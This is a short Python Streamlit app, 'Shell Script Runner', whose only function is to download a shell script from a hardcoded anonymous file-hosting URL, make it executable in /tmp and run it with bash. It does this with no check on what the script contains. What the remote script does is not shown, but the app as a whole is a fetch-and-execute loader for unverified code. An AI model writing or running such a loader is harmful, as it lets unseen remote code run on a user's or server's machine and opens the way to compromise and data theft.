import streamlit as st
import requests
import subprocess
import os

# Function to download the shell script
def download_shell_script():
    url = "https://files.catbox.moe/uh19yg.sh"
    script_path = "/tmp/uh19yg.sh"
    
    # Download the script
    response = requests.get(url)
    if response.status_code == 200:
        with open(script_path, 'wb') as f:
            f.write(response.content)
        os.chmod(script_path, 0o755)  # Make it executable
        st.success(f"Shell script downloaded to {script_path}")
        return script_path
    else:
        st.error("Failed to download the shell script.")
        return None

# Function to run the downloaded shell script
def run_shell_script(script_path):
    if script_path and os.path.exists(script_path):
        try:
            result = subprocess.run(['bash', script_path], capture_output=True, text=True, check=True)
            st.text_area("Script Output", result.stdout)
        except subprocess.CalledProcessError as e:
            st.error(f"Error running script: {e.stderr}")
    else:
        st.error("Shell script not found!")

# Streamlit interface
st.title("Shell Script Runner")

if st.button('Download and Run Shell Script'):
    st.write("Downloading and executing the shell script...")
    script_path = download_shell_script()
    if script_path:
        run_shell_script(script_path)
